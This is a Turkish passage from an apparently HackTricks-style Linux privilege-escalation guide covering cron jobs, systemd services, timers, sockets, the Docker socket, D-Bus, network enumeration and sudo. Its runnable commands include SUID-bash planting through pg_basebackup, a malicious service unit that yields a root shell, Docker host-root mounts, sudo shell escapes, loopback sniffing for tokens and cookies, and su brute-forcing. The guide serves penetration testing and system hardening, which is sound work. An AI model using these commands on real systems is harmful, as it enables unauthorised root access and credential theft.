- `O_EXCL` ile `O_CREAT`: yol zaten varsa işlemi başarısız kılar (saldırganın önceden oluşturduğu bağlantıları/dosyaları engeller).
- `openat()`: güvenilir bir dizin dosya tanıtıcısına göre işlem yapar.
- `mkstemp()`: güvenli izinlerle geçici dosyaları atomik olarak oluşturur.

### Yazılabilir payload'lara sahip özel imzalı cron binary'leri
Bir root cron job'ının çalıştırdığı tam binary'yi yazabilen sıradan bir kullanıcı, bir yetki sınırını aşabilir; ancak özel bir imza denetimi, imzasız bir yedek binary'yi reddedebilir. Belgelenen vakada root'a ait ELF dosyasının modu `0760` idi; bu, grubundaki bir üyenin dosyaya yazmasına, root sahibinin ise dosyayı çalıştırmasına izin veriyordu. Görünür bir süreç izi, job binary'yi çalıştırmadan önce `objcopy`'nin `.text_sig` bölümünü çıkardığını gösteriyordu; doğrulayıcı betiğin tamamı okunamıyordu.<sup>[[2]](#references)</sup>

Başarılı olan yedek, sızdırılmış özel imzalama materyali kullanılarak bir ELF signer ile imzalanmıştı. [Biçim belgeleri](https://github.com/NUAA-WatchDog/linux-elf-binary-signer), çalıştırılabilir dosyanın `.text` bölümünden türetilen bir imza bölümünü açıklıyor. Yalnızca `.text_sig` bölümüne bir sertifika veya eşleşen bir dize eklemenin, görülmeyen doğrulayıcıyı geçmek için yeterli olduğu gösterilmemiştir. Yazılabilir, imzalı bir binary'nin istismar edilebilir olduğu sonucuna varmadan önce gerçek zamanlanmış yolu, etkin yazma erişimini, root çağrısını ve doğrulayıcı ilkesini kontrol edin. Tek başına bir `.text_sig` bölümü yalnızca inceleme için bir ipucudur.

### Sık çalışan cron job'ları

Her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri aramak için süreçleri izleyebilirsiniz. Belki bundan yararlanıp yetki yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede bir izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) kullanabilirsiniz (bu araç başlayan her süreci izler ve listeler).

### Saldırganın belirlediği mode bit’lerini koruyan root yedekleri (pg_basebackup)

Root’a ait bir cron, yazma izniniz olan bir veritabanı dizininde `pg_basebackup` (veya herhangi bir özyinelemeli kopyalama işlemi) çalıştırıyorsa, yedekleme çıktısına aynı mode bit’leriyle **root:root** olarak yeniden kopyalanacak bir **SUID/SGID binary** yerleştirebilirsiniz.<sup>[[26]](#references)</sup>

Tipik keşif akışı (düşük ayrıcalıklı bir DB kullanıcısı olarak):
- Her dakika buna benzer bir komut çalıştıran root cron’unu görmek için `pspy` kullanın: `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Kaynak cluster’ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve iş tamamlandıktan sonra hedefin (`/opt/backups/current`) root’a ait olduğunu doğrulayın.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Bu, `pg_basebackup` küme kopyalanırken dosya izin bitlerini koruduğu için işe yarar; root tarafından çalıştırıldığında hedef dosyalar **root sahipliğini + saldırganın seçtiği SUID/SGID bitlerini** devralır. İzinleri koruyarak çalıştırılabilir bir konuma yazan benzer tüm ayrıcalıklı yedekleme/kopyalama rutinleri savunmasızdır.

### Görünmez cron işleri

Bir yorumdan sonra (yeni satır karakteri olmadan) **satır başı karakteri** ekleyerek bir cron işi oluşturmak mümkündür ve cron işi çalışır. Örnek (satır başı karakterine dikkat edin):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Bu tür gizli kayıtları tespit etmek için, kontrol karakterlerini görünür kılan araçlarla cron dosyalarını inceleyin:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin. Yazabiliyorsanız, hizmet başlatıldığında, yeniden başlatıldığında veya durdurulduğunda **backdoor’unuzu çalıştıracak** şekilde dosyayı **değiştirebilirsiniz** (makine yeniden başlatılana kadar beklemeniz gerekebilir).\
Örneğin, backdoor’unuzu .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun.

### Yazılabilir hizmet ikili dosyaları

Hizmetler tarafından çalıştırılan ikili dosyalara **yazma izniniz** varsa, bunları backdoor’larla değiştirebilirsiniz. Böylece hizmetler yeniden çalıştırıldığında backdoor’lar da çalıştırılır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH’i şu komutla görebilirsiniz:

```bash
systemctl show-environment
```

Yol üzerindeki klasörlerden herhangi birine **yazabildiğinizi** fark ederseniz, **yetkileri yükseltebilirsiniz**. Şunlar gibi servis yapılandırma dosyalarında kullanılan **göreli yolları** aramanız gerekir:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ardından, yazabileceğiniz systemd PATH klasöründe göreli yol ikilisiyle **aynı ada sahip bir çalıştırılabilir dosya** oluşturun. Hizmetten güvenlik açığı bulunan eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde **backdoor**'unuz çalıştırılır (ayrıcalıksız kullanıcılar genellikle hizmetleri başlatamaz/durduramaz, ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi için `man systemd.service` komutunu kullanın.**

## **Timers**

**Timers**, adları `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. Yerleşik takvim zamanı olayları ve monotonik zaman olayları desteği sunduklarından ve eşzamansız çalıştırılabildiklerinden, **Timers** cron'a alternatif olarak kullanılabilir.

Tüm timers'ları şu komutla listeleyebilirsiniz:

```bash
systemctl list-timers --all
```

### Yazılabilir zamanlayıcılar

Bir zamanlayıcıyı değiştirebiliyorsanız, systemd.unit'in mevcut birimlerinden birini (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.

```bash
Unit=backdoor.service
```

Dokümantasyonda Unit'in ne olduğunu okuyabilirsiniz:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, soneki ".timer" olmayan bir unit adıdır. Belirtilmezse bu değer, sonek hariç timer unit ile aynı ada sahip bir service olur. (Yukarıya bakın.) Etkinleştirilen unit adı ile timer unit adı için sonek hariç aynı adın kullanılması önerilir.

Dolayısıyla, bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **Yazılabilir bir binary çalıştıran** bir systemd unit (ör. bir `.service`) bulmak
- **Göreli bir yol çalıştıran** ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olduğunuz bir systemd unit bulmak (bu executable'ı taklit etmek için)

**Timer'lar hakkında daha fazla bilgi için `man systemd.timer` komutunu kullanın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına ve şu komutu çalıştırmaya ihtiyacınız vardır:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Şuna dikkat edin: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumunda kendisine bir symlink oluşturularak **etkinleştirilir**.

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **process iletişimini** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla yapılandırılır.<sup>[[14]](#references)</sup>

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında `man systemd.socket` ile daha fazla bilgi edinebilirsiniz.** Bu dosyada çeşitli ilgi çekici parametreler yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır, ancak özetle soketin **nerede dinleme yapacağını belirtir** (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb.).
- `Accept`: Boolean türünde bir değer alır. **true** ise, **gelen her bağlantı için bir service instance başlatılır** ve bu instance'a yalnızca bağlantı soketi aktarılır. **false** ise, dinleyen soketlerin tümü **başlatılan service unit'e aktarılır** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Gelen tüm trafiği koşulsuz olarak tek bir service unit'in işlediği datagram soketleri ve FIFO'lar için bu değer yok sayılır. **Varsayılan değer false'tur**. Performans nedenleriyle, yeni daemon'ların yalnızca `Accept=no` ile çalışacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Dinleyen **soketler**/FIFO'lar oluşturulup bağlanmadan **önce** veya **sonra** çalıştırılan bir ya da daha fazla komut satırı alır. Komut satırının ilk öğesi mutlak bir dosya adı olmalı, ardından process için argümanlar gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Dinleyen **soketler**/FIFO'lar kapatılıp kaldırılmadan **önce** veya **sonra** çalıştırılan ek **komutlar**.
- `Service`: Gelen **trafikte etkinleştirilecek** **service** unit adını belirtir. Bu ayara yalnızca Accept=no olan soketlerde izin verilir. Varsayılan olarak, soketle aynı adı taşıyan service'i kullanır (sonek değiştirilir). Çoğu durumda bu seçeneği kullanmak gerekmez.

### Yazılabilir .socket dosyaları

**Yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz**; böylece backdoor, soket oluşturulmadan önce çalıştırılır. Bu nedenle, **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekir.**\
_Sistemin bu soket dosyası yapılandırmasını kullanıyor olması gerekir; aksi takdirde backdoor çalıştırılmaz._

### Soket etkinleştirme + yazılabilir unit yolu (eksik service oluşturma)

Yüksek etkili bir başka yanlış yapılandırma örneği:

- `Accept=no` ve `Service=<name>.service` ayarlarına sahip bir socket unit
- Başvurulan service unit'in eksik olması
- Saldırganın `/etc/systemd/system` (veya başka bir unit arama yolu) içine yazabilmesi

Bu durumda saldırgan `<name>.service` dosyasını oluşturabilir, ardından systemd'nin yeni service'i root olarak yükleyip çalıştırması için sokete trafik gönderebilir.

Hızlı akış:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Yazılabilir socket'ler

**Yazılabilir herhangi bir socket tespit ederseniz** (_burada config `.socket` dosyalarından değil, Unix Sockets'tan bahsediyoruz_), bu socket ile **iletişim kurabilir** ve belki bir güvenlik açığından yararlanabilirsiniz.

### Unix Sockets'ı listeleme

```bash
netstat -a -p --unix
```

### Ham bağlantı

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation örneği:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP soketleri

HTTP isteklerini dinleyen bazı **soketler** olabilir (_socket dosyalarından değil, Unix soketi görevi gören dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Eğer socket bir HTTP isteğine **yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bir güvenlik açığından yararlanabilirsiniz**.

### Yazılabilir Docker Socket

Genellikle `/var/run/docker.sock` konumunda bulunan Docker socket, güvenliğinin sağlanması gereken kritik bir dosyadır. Varsayılan olarak `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket üzerinde yazma erişimine sahip olmak, yetki yükseltmeye yol açabilir. Bunun nasıl yapılabileceğine ve Docker CLI kullanılamıyorsa alternatif yöntemlere dair açıklama aşağıda verilmiştir.

#### **Docker CLI ile Yetki Yükseltme**

Docker socket üzerinde yazma erişiminiz varsa, aşağıdaki komutları kullanarak yetkilerinizi yükseltebilirsiniz:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Bu komutlar, ana makinenin dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanıza olanak tanır.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI kullanılamadığında, Unix socket üzerinden ham HTTP kullanılarak Docker socket'inden yine de yararlanılabilir. En güvenilir iş akışı şöyledir:

- Ana makinenin root dizinini bind mount olarak bağlayan, uzun süre çalışan bir yardımcı container oluşturun
- Container'ı başlatın
- Bu yardımcı container içinde bir `exec` örneği oluşturun
- `exec` örneğini başlatın ve çıktıyı API üzerinden geri okuyun

**Docker imajlarını listele**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Bir yardımcı container oluşturun ve başlatın**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Bir exec örneği oluştur**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance'ını başlatın ve çıktıyı okuyun**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Bu kalıp, `attach` işlemini `socat` veya `nc -U` ile elle yürütmeye çalışmaktan genellikle daha sağlamdır. `/:/host` ile bir yardımcı oluşturabildiğinizde, `/host/root/...` gibi dosyaları okumak, `/host/root/.ssh` altına SSH anahtarları eklemek veya ana makinenin başlangıç dosyalarını değiştirmek için ek `exec` örnekleri kullanabilirsiniz.

### Diğerleri

`docker` grubunun **içinde olduğunuz** için docker socket üzerinde yazma izniniz varsa, [**ayrıcalık yükseltmenin daha fazla yoluna**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) sahip olduğunuzu unutmayın. [**docker API bir portta dinliyorsa**, onu da ele geçirebilirsiniz](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

**Container'lardan kaçmanın veya ayrıcalıkları yükseltmek için container çalışma zamanlarını kötüye kullanmanın** daha fazla yolunu şurada inceleyin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) ile ayrıcalık yükseltme

**`ctr`** komutunu kullanabildiğinizi fark ederseniz, **ayrıcalık yükseltmek için onu kötüye kullanabileceğinizden** aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ile ayrıcalık yükseltme

**`runc`** komutunu kullanabildiğinizi fark ederseniz, **ayrıcalık yükseltmek için onu kötüye kullanabileceğinizden** aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **Süreçler Arası İletişim (IPC) sistemidir**. Modern Linux sistemleri göz önünde bulundurularak tasarlanan bu sistem, farklı uygulama iletişimi biçimleri için sağlam bir çerçeve sunar.<sup>[[16]](#references)</sup>

Sistem çok yönlüdür; süreçler arasında veri alışverişini iyileştiren temel IPC'yi destekler ve **geliştirilmiş UNIX alan soketlerini** andırır. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, gelen bir aramayla ilgili Bluetooth daemon'undan gelen sinyal, kullanıcı deneyimini iyileştirmek için müzik çaların sesini kapatmasını sağlayabilir. D-Bus ayrıca uzak nesne sistemini destekleyerek uygulamalar arasında hizmet isteği ve yöntem çağrılarını basitleştirir, geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal gönderimleri vb.) eşleşen ilke kurallarının kümülatif etkisine göre yöneten bir **izin ver/engelle modeli** kullanır. Bu ilkeler, veri yoluyla etkileşimleri tanımlar ve bu izinlerin kötüye kullanılması yoluyla ayrıcalık yükseltmeye olanak sağlayabilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasındaki böyle bir ilke örneği aşağıda verilmiştir. Bu ilke, root kullanıcısının `fi.w1.wpa_supplicant1` sahibi olma, bu adrese mesaj gönderme ve bu adresten mesaj alma izinlerini ayrıntılandırır.

Kullanıcı veya grup belirtilmeyen ilkeler genel olarak uygulanırken, "default" bağlamındaki ilkeler diğer özel ilkelerin kapsamadığı tüm durumlara uygulanır.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus iletişimini nasıl enumerate edip exploit edeceğinizi burada öğrenin:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilgi çekicidir.

### Genel enumerasyon

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Etkin bir `/etc/inetd.conf` girdisi GNU Inetutils `telnetd`'yi root olarak çalıştırıyorsa, yapılandırılmış binary sürümünü ve yerel dinleyiciyi kontrol edin; port yalnızca loopback'e bağlı olsa bile. GNU Inetutils 1.9.3 ile 2.7 arasındaki sürümlerde, istemcinin gönderdiği `USER` değerinin `login -f` komutuna ulaştığı bir [Telnet kimlik doğrulama atlatma açığı](https://seclists.org/oss-sec/2026/q1/89) bulunuyordu (CVE-2026-24061). Bir süreç veya sürüm dizesi yalnızca bir göstergedir; sistemin açığa çıktığı sonucuna varmadan önce satıcının yamalama durumunu ve çalışan gerçek daemon'ı doğrulayın. Daha fazla bilgi için [Telnet kılavuzuna](../../../network-services-pentesting/pentesting-telnet.md) bakın.

### Giden trafik filtrelemesi için hızlı ön değerlendirme

Host komut çalıştırabiliyor ancak callback'ler başarısız oluyorsa DNS, taşıma katmanı, proxy ve rota filtrelemelerini hızla birbirinden ayırın:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Açık portlar

Erişim sağlamadan önce, daha önce etkileşim kuramadığınız makinede çalışan ağ hizmetlerini her zaman kontrol edin:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Classify listener'ları bind hedeflerine göre:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde erişime açık.
- `127.0.0.1` / `::1`: yalnızca yerel erişim (tünel/forward için uygun adaylar).
- Belirli dahili IP'ler (örn. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden erişilebilir.

### Yalnızca yerel servisleri inceleme iş akışı

Bir host'u ele geçirdiğinizde, `127.0.0.1` adresine bind edilmiş servislere çoğu zaman ilk kez shell'inizden erişebilirsiniz. Hızlı bir yerel iş akışı:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### Ağ tarayıcısı olarak LinPEAS (yalnızca ağ modu)

Yerel PE kontrollerinin yanı sıra linPEAS, odaklanmış bir ağ tarayıcısı olarak çalışabilir. `$PATH` içindeki kullanılabilir binary'leri (genellikle `fping`, `ping`, `nc`, `ncat`) kullanır ve araç yüklemez.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` olmadan `-d`, `-p` veya `-i` kullanırsanız linPEAS, ayrıcalık yükseltme kontrollerinin geri kalanını atlayarak yalnızca ağ tarayıcısı olarak çalışır.

### Sniffing

Trafiği sniff edip edemediğinizi kontrol edin. Edebilirseniz bazı kimlik bilgilerini ele geçirebilirsiniz.

```
timeout 1 tcpdump
```

Hızlı pratik kontroller:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`), birçok yalnızca dahili servis token/cookie/kimlik bilgilerini burada açığa çıkardığından post-exploitation aşamasında özellikle değerlidir:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Şimdi yakala, sonra ayrıştır:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Kullanıcılar

### Generic Enumeration

Kim olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** değerine sahip kullanıcıların ayrıcalıklarını yükseltmesine olanak tanıyan bir hatadan etkilenmişti. Daha fazla bilgi: [burada](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [burada](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [burada](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Şununla exploit edin:** **`systemd-run -t /bin/bash`**

### Gruplar

Root yetkileri sağlayabilecek **bir grubun üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Parola Politikası

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bilinen parolalar

Ortamda herhangi bir **parolayı biliyorsanız**, bu parolayı kullanarak **her kullanıcıyla oturum açmayı deneyin**.

### Su Brute

Çok fazla gürültü çıkarmayı sorun etmiyorsanız ve bilgisayarda `su` ile `timeout` binary'leri varsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıları brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), `-a` parametresiyle kullanıcıları brute-force etmeyi de dener.

## Yazılabilir PATH kötüye kullanımları

### $PATH

$PATH içindeki bir klasöre **yazabildiğinizi** fark ederseniz, yazılabilir klasörün içinde, başka bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutla aynı adı taşıyan ve $PATH içinde yazılabilir klasörünüzden **önce gelen bir klasörden yüklenmeyen** bir backdoor **oluşturarak ayrıcalıkları yükseltebilirsiniz**.

### SUDO ve SUID

Bir komutu sudo kullanarak çalıştırmanıza izin veriliyor olabilir veya komutun suid biti etkin olabilir. Şunu kullanarak kontrol edin:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza, hatta bir komut çalıştırmanıza olanak tanır**.<sup>[[8]](#references)</sup> Örneğin:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden başka bir kullanıcının yetkileriyle bazı komutları çalıştırmasına izin verebilir.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Bu örnekte demo kullanıcısı vim'i root olarak çalıştırabilir; artık root dizinine bir SSH anahtarı ekleyerek veya sh çağırarak shell elde etmek çok kolaydır.

```
sudo vim -c '!sh'
```

### sudo scriptinde tırnak içine alınmamış Bash karşılaştırması

Bash'te `[[ "$protected" == $candidate ]]` ifadesinin sağ tarafı bir kalıptır. Root yetkisiyle çalışabilen bir sudo script'i `candidate` değerini çağıranın kontrolündeki bir dosyadan alıyorsa, `prefix*` gibi bir değer korunan bir dizenin başlangıcıyla eşleşebilir. Farklı başarı ve hata yolları daha sonra bir prefix oracle açığa çıkarabilir. Amaç birebir eşleşmeyse sağ tarafı tırnak içine alın (`[[ "$protected" == "$candidate" ]]`). Tırnak içine alınmamış bir karşılaştırmayı istismar edilebilir kabul etmeden önce gerçek sudo argümanlarını, girdinin kaynağını ve gözlemlenebilir dallanma davranışını inceleyin. [GNU Bash kılavuzu](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) bu kalıp davranışını açıklar.

### sudo altında PrusaSlicer proje dosyaları

